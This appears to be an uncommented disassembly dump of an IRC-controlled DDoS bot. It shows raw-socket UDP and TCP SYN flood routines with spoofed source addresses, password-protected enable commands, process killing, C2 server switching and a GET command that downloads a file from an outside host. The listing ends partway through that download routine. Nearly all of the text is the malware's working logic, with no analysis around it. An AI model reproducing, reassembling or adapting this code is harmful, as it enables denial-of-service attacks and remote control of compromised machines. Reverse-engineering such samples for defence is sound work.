add dword [var_8h], 1
mov edx, dword [var_8h]
mov eax, dword [s1]
mov ecx, 0xffffffff
mov dword [var_18h], eax
mov eax, 0
cld
mov edi, dword [var_18h]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
cmp edx, eax
jae 0x804be46
mov eax, dword [var_8h]
add eax, dword [s1]
movzx eax, byte [eax]
cmp al, 0x21
jne 0x804be11
mov eax, dword [var_8h]
add eax, dword [s1]
mov byte [eax], 0
mov eax, dword [obj.nick]
mov dword [s2], eax
mov eax, dword [s1]
mov dword [esp], eax
call sym.imp.strcasecmp
test eax, eax
jne 0x804be9b
mov eax, dword [src]
movzx eax, byte [eax]
cmp al, 0x3a
jne 0x804be75
add dword [src], 1
mov eax, dword [obj.nick]
test eax, eax
je 0x804be8b
mov eax, dword [obj.nick]
mov dword [esp], eax
call sym.imp.free
mov eax, dword [src]
mov dword [esp], eax
call sym.imp.strdup
mov dword [obj.nick], eax
add esp, 0x24
pop edi
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], str.NOTICE__s_:Unable_to_comply._n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
leave
ret
push ebp
mov ebp, esp
sub esp, 0x638
mov dword [var_24h], 0
mov dword [esp], 0
call sym.imp.time
mov dword [var_4h], eax
mov eax, dword [arg_ch]
mov dword [esp], eax
call sym.mfork
test eax, eax
jne 0x804a17e
mov dword [protocol], 0xff
mov dword [type], 3
mov dword [esp], 2
call sym.imp.socket
mov dword [var_bp_8h], eax
cmp dword [var_bp_8h], 0
jns 0x8049f35
mov dword [esp], 1
call sym.imp.exit
cmp dword [arg_10h], 2
jg 0x8049f61
mov eax, dword [arg_ch]
mov dword [protocol], eax
mov dword [type], str.NOTICE__s_:UDP__target___port___secs__n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
mov dword [esp], 1
call sym.imp.exit
mov eax, dword [str]
add eax, 4
mov eax, dword [eax]
mov dword [type], eax
mov eax, dword [arg_ch]
mov dword [esp], eax
call sym.host2ip
mov dword [var_1ch], eax
mov eax, dword [str]
add eax, 8
mov eax, dword [eax]
mov dword [esp], eax
call sym.imp.atoi
mov dword [var_28h], eax
mov eax, dword [str]
add eax, 0xc
mov eax, dword [eax]
mov dword [esp], eax
call sym.imp.atol
mov dword [var_18h], eax
lea eax, [var_614h]
mov dword [var_14h], eax
lea eax, [var_614h]
add eax, 0x14
mov dword [var_10h], eax
lea eax, [var_614h]
add eax, 0x1c
mov dword [s], eax
mov dword [protocol], 0x5c0
mov dword [type], 0xa
mov eax, dword [s]
mov dword [esp], eax
call sym.imp.memset
mov eax, dword [str]
add eax, 4
mov eax, dword [eax]
mov dword [var_sp_ch], eax
mov eax, dword [arg_ch]
mov dword [protocol], eax
mov dword [type], str.NOTICE__s_:UDP_Packeting__s._n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
mov edx, dword [var_14h]
movzx eax, byte [edx]
and eax, 0xfffffff0
or eax, 5
mov byte [edx], al
mov edx, dword [var_14h]
movzx eax, byte [edx]
and eax, 0xf
or eax, 0x40
mov byte [edx], al
mov eax, dword [var_14h]
mov byte [eax + 1], 0
mov eax, dword [var_14h]
mov word [eax + 2], 0x5dc
mov eax, dword [var_14h]
mov word [eax + 6], 0
mov eax, dword [var_14h]
mov byte [eax + 9], 0x11
mov eax, dword [var_14h]
mov byte [eax + 8], 0x40
mov edx, dword [var_14h]
mov eax, dword [var_1ch]
mov dword [edx + 0x10], eax
mov eax, dword [var_20h]
movzx eax, ax
mov dword [esp], eax
call sym.imp.htons
mov edx, eax
mov eax, dword [var_10h]
mov word [eax + 4], dx
mov word [var_38h], 2
mov eax, dword [var_1ch]
mov dword [var_34h], eax
call sym.imp.rand
mov edx, eax
mov eax, dword [var_10h]
mov word [eax], dx
cmp dword [var_28h], 0
je 0x804a09e
mov eax, dword [var_28h]
movzx eax, ax
mov dword [esp], eax
call sym.imp.htons
mov edx, eax
mov eax, dword [var_10h]
mov word [eax + 2], dx
jmp 0x804a0ac
call sym.imp.rand
mov edx, eax
mov eax, dword [var_10h]
mov word [eax + 2], dx
lea eax, [var_614h]
mov dword [type], 0x5dc
mov dword [esp], eax
call sym.in_cksum
mov edx, eax
mov eax, dword [var_10h]
mov word [eax + 6], dx
call sym.getspoof
mov edx, eax
mov eax, dword [var_14h]
mov dword [eax + 0xc], edx
call sym.imp.rand
mov edx, eax
mov eax, dword [var_14h]
mov word [eax + 4], dx
lea eax, [var_614h]
mov dword [type], 0x5dc
mov dword [esp], eax
call sym.in_cksum
mov edx, eax
mov eax, dword [var_14h]
mov word [eax + 0xa], dx
mov eax, dword [var_10h]
movzx eax, word [eax + 2]
mov word [var_36h], ax
lea eax, [var_38h]
mov dword [var_sp_14h], 0x10
mov dword [var_sp_10h], eax
mov dword [var_sp_ch], 0
mov dword [protocol], 0x5dc
lea eax, [var_614h]
mov dword [type], eax
mov eax, dword [var_bp_8h]
mov dword [esp], eax
call sym.imp.sendto
cmp dword [var_24h], 0x31
jbe 0x804a175
mov dword [esp], 0
call sym.imp.time
mov edx, eax
mov eax, dword [var_4h]
add eax, dword [var_18h]
cmp edx, eax
jb 0x804a16e
mov dword [esp], 0
call sym.imp.exit
mov dword [var_24h], 0
add dword [var_24h], 1
jmp 0x804a072
leave
ret
push ebp
mov ebp, esp
sub esp, 0x18
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov dword [var_4h], str.PONG__s_n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
leave
ret
push ebp
mov ebp, esp
sub esp, 0x18
cmp dword [arg_10h], 1
je 0x804b3bd
mov eax, dword [arg_ch]
mov dword [var_8h], eax
mov dword [s2], str.NOTICE__s_:ENABLE__pass__n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
movzx eax, byte [obj.disabled]
test al, al
je 0x804b390
mov dword [var_bp_4h], str.Disabled
jmp 0x804b397
mov dword [var_bp_4h], str.Enabled_and_awaiting_orders
mov eax, dword [var_bp_4h]
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_8h], eax
mov dword [s2], str.NOTICE__s_:Current_status_is:__s._n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
jmp 0x804b43d
movzx eax, byte [obj.disabled]
test al, al
jne 0x804b3e4
mov eax, dword [arg_ch]
mov dword [var_8h], eax
mov dword [s2], str.NOTICE__s_:Already_enabled._n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
jmp 0x804b43d
mov eax, dword [arg_14h]
add eax, 4
mov eax, dword [eax]
mov dword [s2], eax
mov dword [esp], obj.dispass
call sym.imp.strcasecmp
test eax, eax
je 0x804b41c
mov eax, dword [arg_ch]
mov dword [var_8h], eax
mov dword [s2], str.NOTICE__s_:Wrong_password_n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
jmp 0x804b43d
mov byte [obj.disabled], 0
mov eax, dword [arg_ch]
mov dword [var_8h], eax
mov dword [s2], str.NOTICE__s_:Password_correct._n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 0x24
mov dword [var_8h], 0
jmp 0x804b53d
mov eax, dword [var_8h]
shl eax, 2
mov edx, eax
mov eax, dword [obj.pids]
lea eax, [edx + eax]
mov eax, dword [eax]
test eax, eax
je 0x804b539
mov eax, dword [var_8h]
shl eax, 2
mov edx, eax
mov eax, dword [obj.pids]
lea eax, [edx + eax]
mov ebx, dword [eax]
call sym.imp.getpid
cmp ebx, eax
je 0x804b539
cmp dword [arg_ch], 0
je 0x804b517
mov eax, dword [var_8h]
shl eax, 2
mov edx, eax
mov eax, dword [obj.pids]
lea eax, [edx + eax]
mov eax, dword [eax]
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_sp_8h], eax
mov dword [sig], str.NOTICE__s_:Killing_pid__d._n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
mov eax, dword [var_8h]
shl eax, 2
mov edx, eax
mov eax, dword [obj.pids]
lea eax, [edx + eax]
mov eax, dword [eax]
mov dword [sig], 9
mov dword [esp], eax
call sym.imp.kill
add dword [var_8h], 1
mov eax, dword [obj.numpids]
cmp dword [var_8h], eax
jb 0x804b4b0
add esp, 0x24
pop ebx
pop ebp
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
call sym.__i686.get_pc_thunk.bx
add ebx, 0x1c21
sub esp, 0x1c
call sym._init
lea eax, [ebx - 0xe0]
mov dword [var_10h], eax
lea eax, [ebx - 0xe0]
sub dword [var_10h], eax
sar dword [var_10h], 2
mov edx, dword [var_10h]
test edx, edx
je 0x804c6f1
xor edi, edi
mov esi, eax
lea esi, [esi]
mov eax, dword [arg_10h]
add edi, 1
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call dword [esi]
add esi, 4
cmp dword [var_10h], edi
jne 0x804c6d0
add esp, 0x1c
pop ebx
pop esi
pop edi
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 0x48
mov dword [var_1ch], 1
mov dword [esp], 0x2400
call sym.imp.malloc
mov dword [var_ch], eax
mov dword [esp], 0
call sym.imp.time
mov dword [var_4h], eax
mov eax, dword [arg_ch]
mov dword [esp], eax
call sym.mfork
test eax, eax
jne 0x804b079
cmp dword [arg_10h], 1
jg 0x804af35
mov eax, dword [arg_ch]
mov dword [protocol], eax
mov dword [request], str.NOTICE__s_:X9SYN__target___secs__n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
mov dword [esp], 1
call sym.imp.exit
mov eax, dword [str]
add eax, 8
mov eax, dword [eax]
mov dword [esp], eax
call sym.imp.atol
mov dword [var_10h], eax
mov dword [protocol], 0x10
mov dword [request], 0
lea eax, [s]
mov dword [esp], eax
call sym.imp.memset
mov eax, dword [str]
add eax, 4
mov eax, dword [eax]
mov dword [request], eax
mov eax, dword [arg_ch]
mov dword [esp], eax
call sym.host2ip
mov dword [var_28h], eax
mov word [s], 2
mov eax, dword [str]
add eax, 4
mov eax, dword [eax]
mov dword [var_sp_ch], eax
mov eax, dword [arg_ch]
mov dword [protocol], eax
mov dword [request], str.NOTICE__s_:Initated_x9syn_Flood_on__s.__9216byte__bufferfly__n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
call sym.imp.rand
mov word [var_2ah], ax
mov dword [protocol], 0x11
mov dword [request], 2
mov dword [esp], 2
call sym.imp.socket
mov dword [fildes], eax
cmp dword [fildes], 0
js 0x804b034
mov dword [var_1ch], 1
lea eax, [var_1ch]
mov dword [protocol], eax
mov dword [request], 0x5421
mov eax, dword [fildes]
mov dword [esp], eax
call sym.imp.ioctl
lea eax, [s]
mov dword [var_sp_14h], 0x10
mov dword [var_sp_10h], eax
mov dword [var_sp_ch], 0
mov dword [protocol], 0x2400
mov eax, dword [var_ch]
mov dword [request], eax
mov eax, dword [fildes]
mov dword [esp], eax
call sym.imp.sendto
mov eax, dword [fildes]
mov dword [esp], eax
call sym.imp.close
cmp dword [var_14h], 0x31
jle 0x804b059
mov dword [esp], 0
call sym.imp.time
mov edx, eax
mov eax, dword [var_4h]
add eax, dword [var_10h]
cmp edx, eax
jae 0x804b062
mov dword [var_14h], 0
add dword [var_14h], 1
jmp 0x804afa9
mov eax, dword [fildes]
mov dword [esp], eax
call sym.imp.close
mov dword [esp], 0
call sym.imp.exit
leave
ret
push ebp
mov ebp, esp
sub esp, 0x18
mov eax, dword [arg_ch]
mov dword [var_8h], eax
mov dword [var_4h], str.NOTICE__s_:9x9_priv0_1.2_n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
leave
ret
push ebp
mov ebp, esp
sub esp, 0x18
cmp dword [arg_10h], 0
jg 0x804b471
mov eax, dword [arg_ch]
mov dword [var_8h], eax
mov dword [var_4h], str.NOTICE__s_:MOVE__server__n
mov eax, dword [fildes]
mov dword [esp], eax
call sym.Send
mov dword [esp], 1
call sym.imp.exit
mov eax, dword [src]
add eax, 4
mov eax, dword [eax]
mov dword [esp], eax
call sym.imp.strdup
mov dword [obj.server], eax
mov dword [obj.changeservers], 1
mov eax, dword [fildes]
mov dword [esp], eax
call sym.imp.close
leave
ret
jmp dword [reloc.strdup]
push ebp
mov ebp, esp
sub esp, 0x48
mov dword [var_1ch], 1
mov dword [esp], 0x80
call sym.imp.malloc
mov dword [var_ch], eax
mov dword [esp], 0
call sym.imp.time
mov dword [var_4h], eax
mov eax, dword [arg_ch]
mov dword [esp], eax
call sym.mfork
test eax, eax
jne 0x804a71c
cmp dword [arg_10h], 1
jg 0x804a5d8
mov eax, dword [arg_ch]
mov dword [protocol], eax
mov dword [request], str.NOTICE__s_:MRA__target___secs__n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
mov dword [esp], 1
call sym.imp.exit
mov eax, dword [str]
add eax, 8
mov eax, dword [eax]
mov dword [esp], eax
call sym.imp.atol
mov dword [var_10h], eax
mov dword [protocol], 0x10
mov dword [request], 0
lea eax, [s]
mov dword [esp], eax
call sym.imp.memset
mov eax, dword [str]
add eax, 4
mov eax, dword [eax]
mov dword [request], eax
mov eax, dword [arg_ch]
mov dword [esp], eax
call sym.host2ip
mov dword [var_28h], eax
mov word [s], 2
mov eax, dword [str]
add eax, 4
mov eax, dword [eax]
mov dword [var_sp_ch], eax
mov eax, dword [arg_ch]
mov dword [protocol], eax
mov dword [request], str.NOTICE__s_:Mraring__s._n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
call sym.imp.rand
mov word [var_2ah], ax
mov dword [protocol], 0x11
mov dword [request], 2
mov dword [esp], 2
call sym.imp.socket
mov dword [fildes], eax
cmp dword [fildes], 0
js 0x804a6d7
mov dword [var_1ch], 1
lea eax, [var_1ch]
mov dword [protocol], eax
mov dword [request], 0x5421
mov eax, dword [fildes]
mov dword [esp], eax
call sym.imp.ioctl
lea eax, [s]
mov dword [var_sp_14h], 0x10
mov dword [var_sp_10h], eax
mov dword [var_sp_ch], 0
mov dword [protocol], 0x80
mov eax, dword [var_ch]
mov dword [request], eax
mov eax, dword [fildes]
mov dword [esp], eax
call sym.imp.sendto
mov eax, dword [fildes]
mov dword [esp], eax
call sym.imp.close
cmp dword [var_14h], 0x31
jle 0x804a6fc
mov dword [esp], 0
call sym.imp.time
mov edx, eax
mov eax, dword [var_4h]
add eax, dword [var_10h]
cmp edx, eax
jae 0x804a705
mov dword [var_14h], 0
add dword [var_14h], 1
jmp 0x804a64c
mov eax, dword [fildes]
mov dword [esp], eax
call sym.imp.close
mov dword [esp], 0
call sym.imp.exit
leave
ret
push ebp
mov ebp, esp
sub esp, 0x118
lea ecx, [s1]
mov edx, obj.C.87.5278
mov eax, 0x50
mov dword [protocol], eax
mov dword [type], edx
mov dword [esp], ecx
call sym.imp.memcpy
mov dword [var_28h], 0
mov dword [var_24h], 0x14
mov dword [esp], 0
call sym.imp.time
mov dword [var_bp_8h], eax
mov eax, dword [arg_ch]
mov dword [esp], eax
call sym.mfork
test eax, eax
jne 0x804aec9
cmp dword [arg_10h], 2
jg 0x804ab62
mov eax, dword [arg_ch]
mov dword [protocol], eax
mov dword [type], str.NOTICE__s_:SYN__target___port___secs__n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
mov dword [esp], 1
call sym.imp.exit
mov dword [protocol], 0xff
mov dword [type], 3
mov dword [esp], 2
call sym.imp.socket
mov dword [var_ch], eax
cmp dword [var_ch], 0
jns 0x804ab93
mov dword [esp], 1
call sym.imp.exit
mov dword [var_bp_4h], 0
jmp 0x804abb1
mov edx, dword [var_bp_4h]
mov eax, dword [var_bp_4h]
mov eax, dword [ebp + eax*4 - 0xf8]
mov byte [ebp + edx - 0x3c], al
add dword [var_bp_4h], 1
cmp dword [var_bp_4h], 0x13
jle 0x804ab9c
mov eax, dword [str]
add eax, 4
mov eax, dword [eax]
mov dword [type], eax
mov eax, dword [arg_ch]
mov dword [esp], eax
call sym.host2ip
mov dword [var_14h], eax
mov eax, dword [str]
add eax, 0xc
mov eax, dword [eax]
mov dword [esp], eax
call sym.imp.atol
mov dword [var_10h], eax
mov eax, dword [str]
add eax, 4
mov eax, dword [eax]
mov dword [var_sp_ch], eax
mov eax, dword [arg_ch]
mov dword [protocol], eax
mov dword [type], str.NOTICE__s_:Syning_with_TCP_SYN__s._n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
movzx eax, byte [var_64h]
and eax, 0xfffffff0
or eax, 5
mov byte [var_64h], al
movzx eax, byte [var_64h]
and eax, 0xf
or eax, 0x40
mov byte [var_64h], al
mov byte [var_63h], 0x10
mov word [var_5eh], 0x40
mov byte [var_5ch], 0x40
mov byte [var_5bh], 6
mov dword [var_48h], 0
movzx eax, byte [var_44h]
and eax, 0xf
or eax, 0xffffffa0
mov byte [var_44h], al
movzx eax, byte [var_44h]
and eax, 0xfffffff0
mov byte [var_44h], al
movzx eax, byte [var_43h]
and eax, 0x7f
mov byte [var_43h], al
movzx eax, byte [var_43h]
and eax, 0xffffffbf
mov byte [var_43h], al
movzx eax, byte [var_43h]
and eax, 0xffffffdf
mov byte [var_43h], al
movzx eax, byte [var_43h]
and eax, 0xffffffef
mov byte [var_43h], al
movzx eax, byte [var_43h]
and eax, 0xfffffff7
mov byte [var_43h], al
movzx eax, byte [var_43h]
and eax, 0xfffffffb
mov byte [var_43h], al
movzx eax, byte [var_43h]
and eax, 0xfffffffe
mov byte [var_43h], al
movzx eax, byte [var_43h]
or eax, 2
mov byte [var_43h], al
mov word [var_42h], 0x787d
mov word [var_3eh], 0
mov eax, dword [str]
add eax, 8
mov eax, dword [eax]
mov dword [esp], eax
call sym.imp.atoi
movzx eax, ax
mov dword [esp], eax
call sym.imp.htons
movzx eax, ax
mov dword [var_1ch], eax
call sym.imp.rand
mov dword [var_20h], eax
mov eax, dword [str]
add eax, 8
mov eax, dword [eax]
mov dword [esp], eax
call sym.imp.atoi
test eax, eax
jne 0x804acf5
call sym.imp.rand
mov dword [var_1ch], eax
call sym.getspoof
mov dword [var_18h], eax
mov eax, dword [var_24h]
add eax, 0x28
movzx eax, ax
mov dword [esp], eax
call sym.imp.htons
mov word [var_62h], ax
call sym.imp.rand
mov word [var_60h], ax
mov eax, dword [var_18h]
mov dword [var_58h], eax
mov eax, dword [var_14h]
mov dword [var_54h], eax
mov word [var_5ah], 0
mov eax, dword [var_20h]
mov word [var_50h], ax
mov eax, dword [var_1ch]
mov word [var_4eh], ax
call sym.imp.rand
mov dword [var_4ch], eax
mov word [var_40h], 0
mov word [var_a8h], 2
mov eax, dword [var_1ch]
mov word [var_a6h], ax
mov eax, dword [var_54h]
mov dword [var_a4h], eax
lea eax, [var_64h]
mov dword [type], 0x14
mov dword [esp], eax
call sym.in_cksum
mov word [var_5ah], ax
call sym.imp.rand
mov dword [var_fch], eax
lea eax, [var_fch]
movzx eax, byte [eax]
mov byte [var_33h], al
lea eax, [var_fch]
add eax, 1
movzx eax, byte [eax]
mov byte [var_32h], al
lea eax, [var_fch]
add eax, 2
movzx eax, byte [eax]
mov byte [var_31h], al
lea eax, [var_fch]
add eax, 3
movzx eax, byte [eax]
mov byte [var_30h], al
mov eax, dword [var_58h]
mov dword [var_98h], eax
mov eax, dword [var_54h]
mov dword [var_94h], eax
mov byte [var_90h], 0
mov byte [var_8fh], 6
mov eax, dword [var_24h]
add eax, 0x14
movzx eax, ax
mov dword [esp], eax
call sym.imp.htons
mov word [var_8eh], ax
lea eax, [var_98h]
lea edx, [eax + 0xc]
lea eax, [var_64h]
add eax, 0x14
mov dword [protocol], 0x14
mov dword [type], edx
mov dword [esp], eax
call sym.imp.bcopy
mov eax, dword [var_24h]
mov dword [protocol], eax
lea eax, [var_98h]
add eax, 0x20
mov dword [type], eax
lea eax, [var_64h]
add eax, 0x28
mov dword [esp], eax
call sym.imp.bcopy
mov eax, dword [var_24h]
add eax, 0x20
lea edx, [var_98h]
mov dword [type], eax
mov dword [esp], edx
call sym.in_cksum
mov word [var_40h], ax
lea eax, [var_a8h]
mov edx, dword [var_24h]
add edx, 0x28
mov dword [var_sp_14h], 0x10
mov dword [var_sp_10h], eax
mov dword [var_sp_ch], 0
mov dword [protocol], edx
lea eax, [var_64h]
mov dword [type], eax
mov eax, dword [var_ch]
mov dword [esp], eax
call sym.imp.sendto
cmp dword [var_28h], 0x31
jbe 0x804aec0
mov dword [esp], 0
call sym.imp.time
mov edx, eax
mov eax, dword [var_bp_8h]
add eax, dword [var_10h]
cmp edx, eax
jb 0x804aeb9
mov dword [esp], 0
call sym.imp.exit
mov dword [var_28h], 0
add dword [var_28h], 1
jmp 0x804acd1
leave
ret
push ebp
mov ebp, esp
push edi
sub esp, 0x14
cmp dword [arg_10h], 1
je 0x8049bd4
mov eax, dword [arg_ch]
mov dword [var_sp_8h], eax
mov dword [var_4h], str.NOTICE__s_:NICK__nick__n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
jmp 0x8049c36
mov eax, dword [arg_14h]
add eax, 4
mov eax, dword [eax]
mov ecx, 0xffffffff
mov dword [var_8h], eax
mov eax, 0
cld
mov edi, dword [var_8h]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
cmp eax, 9
jbe 0x8049c17
mov eax, dword [arg_ch]
mov dword [var_sp_8h], eax
mov dword [var_4h], str.NOTICE__s_:Nick_cannot_be_larger_than_9_characters._n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
jmp 0x8049c36
mov eax, dword [arg_14h]
add eax, 4
mov eax, dword [eax]
mov dword [var_sp_8h], eax
mov dword [var_4h], str.NICK__s_n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
add esp, 0x14
pop edi
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 0xc
cmp dword [arg_ch], 0
jne 0x804953d
mov dword [var_bp_4h], 1
jmp 0x8049569
cmp dword [arg_ch], 1
jne 0x804954b
mov eax, dword [arg_8h]
mov dword [var_bp_4h], eax
jmp 0x8049569
mov eax, dword [arg_ch]
sub eax, 1
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.pow
mov edx, eax
imul edx, dword [arg_8h]
mov dword [var_bp_4h], edx
mov eax, dword [var_bp_4h]
leave
ret
push ebp
mov ebp, esp
push edi
sub esp, 0x134
cmp dword [arg_10h], 1
je 0x8049c7f
mov eax, dword [arg_ch]
mov dword [var_sp_8h], eax
mov dword [src], str.NOTICE__s_:Removed_all_spoofs_n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
mov dword [obj.spoofs], 0
mov dword [obj.spoofsm], 0
jmp 0x8049e3a
mov eax, dword [arg_14h]
add eax, 4
mov eax, dword [eax]
mov ecx, 0xffffffff
mov dword [var_118h], eax
mov eax, 0
cld
mov edi, dword [var_118h]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
cmp eax, 0x10
jbe 0x8049ccb
mov eax, dword [arg_ch]
mov dword [var_sp_8h], eax
mov dword [src], str.NOTICE__s_:What_kind_of_subnet_address_is_that__Do_something_like:_169.40_n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
jmp 0x8049e3a
mov eax, dword [arg_14h]
add eax, 4
mov eax, dword [eax]
mov dword [src], eax
lea eax, [dest]
mov dword [esp], eax
call sym.imp.strcpy
lea eax, [dest]
mov ecx, 0xffffffff
mov dword [var_11ch], eax
mov eax, 0
cld
mov edi, dword [var_11ch]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
sub eax, 1
movzx eax, byte [ebp + eax - 0x110]
cmp al, 0x2e
jne 0x8049d4b
lea eax, [dest]
mov ecx, 0xffffffff
mov dword [var_120h], eax
mov eax, 0
cld
mov edi, dword [var_120h]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
sub eax, 1
mov byte [ebp + eax - 0x110], 0
mov dword [var_10h], 0
mov dword [var_ch], 1
jmp 0x8049d72
mov eax, dword [var_10h]
movzx eax, byte [ebp + eax - 0x110]
cmp al, 0x2e
jne 0x8049d6e
add dword [var_ch], 1
add dword [var_10h], 1
mov edx, dword [var_10h]
lea eax, [dest]
mov ecx, 0xffffffff
mov dword [var_124h], eax
mov eax, 0
cld
mov edi, dword [var_124h]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
cmp edx, eax
jb 0x8049d5b
mov eax, 4
sub eax, dword [var_ch]
mov dword [var_ch], eax
mov dword [var_10h], 0
jmp 0x8049def
lea edx, [dest]
lea eax, [dest]
mov ecx, 0xffffffff
mov dword [var_128h], eax
mov eax, 0
cld
mov edi, dword [var_128h]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
lea eax, [edx + eax]
mov word [eax], 0x302e
mov byte [eax + 2], 0
add dword [var_10h], 1
mov eax, dword [var_10h]
cmp eax, dword [var_ch]
jl 0x8049db3
lea eax, [dest]
mov dword [esp], eax
call sym.imp.inet_network
mov dword [var_8h], eax
cmp dword [var_ch], 0
jne 0x8049e1a
mov dword [obj.spoofsm], 1
jmp 0x8049e32
mov eax, dword [var_ch]
mov dword [src], eax
mov dword [esp], 0x100
call sym.pow
mov dword [obj.spoofsm], eax
mov eax, dword [var_8h]
mov dword [obj.spoofs], eax
add esp, 0x134
pop edi
pop ebp
ret
push ebp
mov ebp, esp
push edi
push esi
sub esp, 0x1470
mov eax, dword [arg_ch]
mov dword [esp], eax
call sym.mfork
test eax, eax
jne 0x8049a4c
cmp dword [arg_10h], 1
jg 0x8049639
mov eax, dword [arg_ch]
mov dword [protocol], eax
mov dword [stream], str.NOTICE__s_:GET__host___save_as__n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
mov dword [esp], 0
call sym.imp.exit
mov dword [protocol], 0
mov dword [stream], 1
mov dword [esp], 2
call sym.imp.socket
mov dword [fildes], eax
cmp dword [fildes], 0xffffffff
jne 0x8049684
mov eax, dword [arg_ch]
mov dword [protocol], eax
mov dword [stream], str.NOTICE__s_:Unable_to_create_socket._n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
mov dword [esp], 0
call sym.imp.exit
mov eax, dword [filename]
add eax, 4
mov eax, dword [eax]
mov dword [var_144ch], eax
mov dword [var_1450h], str.http:__
mov dword [var_1454h], 7
cld
mov esi, dword [var_144ch]
mov edi, dword [var_1450h]
mov ecx, dword [var_1454h]
repe cmpsb byte [esi], byte ptr es:[edi]
seta dl
setb al
mov ecx, edx
sub cl, al
mov eax, ecx
movsx eax, al
test eax, eax
jne 0x80496ed
mov eax, dword [filename]
add eax, 4
mov eax, dword [eax]
add eax, 7
mov dword [stream], eax
lea eax, [dest]
mov dword [esp], eax
call sym.imp.strcpy
jmp 0x8049707
mov eax, dword [filename]
add eax, 4
mov eax, dword [eax]
mov dword [stream], eax
lea eax, [dest]
mov dword [esp], eax
call sym.imp.strcpy
mov dword [var_28h], 0
jmp 0x8049714
add dword [var_28h], 1
mov edx, dword [var_28h]
lea eax, [dest]
mov ecx, 0xffffffff
mov dword [var_1458h], eax
mov eax, 0
cld
mov edi, dword [var_1458h]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
cmp edx, eax
jae 0x8049750
mov eax, dword [var_28h]
movzx eax, byte [ebp + eax - 0x43c]
cmp al, 0x2f
jne 0x8049710
mov eax, dword [var_28h]
mov byte [ebp + eax - 0x43c], 0
mov word [var_3ch], 2
mov dword [esp], 0x16
call sym.imp.htons
mov word [var_3ah], ax
lea eax, [dest]
mov dword [esp], eax
call sym.imp.inet_addr
mov dword [var_20h], eax
cmp dword [var_20h], 0xffffffff
jne 0x80497e4
lea eax, [dest]
mov dword [esp], eax
call sym.imp.gethostbyname
mov dword [var_18h], eax
cmp dword [var_18h], 0
jne 0x80497c5
mov eax, dword [arg_ch]
mov dword [protocol], eax
mov dword [stream], str.NOTICE__s_:Unable_to_resolve_address._n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
mov dword [esp], 0
call sym.imp.exit
mov eax, dword [var_18h]
mov eax, dword [eax + 0xc]
mov ecx, eax
mov eax, dword [var_18h]
mov eax, dword [eax + 0x10]
mov edx, dword [eax]
lea eax, [var_3ch]
add eax, 4
mov edi, eax
mov esi, edx
cld
rep movsb byte es:[edi], byte ptr [esi]
jmp 0x80497ea
mov eax, dword [var_20h]
mov dword [var_38h], eax
lea eax, [var_3ch]
add eax, 8
mov dword [eax], 0
mov dword [eax + 4], 0
lea eax, [var_3ch]
mov dword [protocol], 0x10
mov dword [stream], eax
mov eax, dword [fildes]
mov dword [esp], eax
call sym.imp.connect
test eax, eax
je 0x8049841
mov eax, dword [arg_ch]
mov dword [protocol], eax
mov dword [stream], str.NOTICE__s_:Unable_to_connect_to_http._n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
mov dword [esp], 0
call sym.imp.exit
mov eax, dword [var_28h]
mov edx, eax
lea eax, [dest]
add eax, edx
lea edx, [eax + 1]
lea eax, [dest]
mov dword [flags], eax
mov dword [protocol], edx
mov dword [stream], str.GET___s_HTTP_1.0_r_nConnection:_Keep_Alive_r_nUser_Agent:_Mozilla_4.75__en___X11__U__Linux_2.2.16_3_i686__r_nHost:__s:80_r_nAccept:_image_gif__image_x_xbitmap__image_jpeg__image_pjpeg__image_png____r_nAccept_Encoding:_gzip_r_nAccept_Language:_en_r_nAccept_Charset:_iso_8859_1__utf_8_r_n_r_n
mov eax, dword [fildes]
mov dword [esp], eax
call sym.Send
mov eax, dword [arg_ch]
mov dword [protocol], eax
mov dword [stream], str.NOTICE__s_:Receiving_file._n
